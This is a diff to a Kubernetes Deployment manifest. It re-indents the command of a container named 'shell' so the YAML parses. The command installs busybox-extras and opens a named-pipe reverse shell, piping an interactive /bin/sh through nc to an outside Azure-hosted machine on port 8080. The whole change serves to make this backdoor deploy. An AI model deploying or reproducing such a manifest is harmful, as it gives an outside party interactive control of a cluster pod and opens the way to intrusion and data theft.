@@ -1,5 +1,3 @@
-
-
 apiVersion: apps/v1
 kind: Deployment
 metadata:
@@ -17,12 +15,12 @@ spec:
       containers:
         - name: shell
           image: alpine
-         command:
-  - sh
-  - -c
-  - |
-    apk add --no-cache busybox-extras;
-    mkfifo /tmp/f; /bin/sh -i < /tmp/f 2>&1 | nc potter-maga.brazilsouth.cloudapp.azure.com 8080 > /tmp/f
-
+          command:
+            - sh
+            - -c
+            - |
+              apk add --no-cache busybox-extras;
+              mkfifo /tmp/f;
+              /bin/sh -i < /tmp/f 2>&1 | nc potter-maga.brazilsouth.cloudapp.azure.com 8080 > /tmp/f
           stdin: true
           tty: true
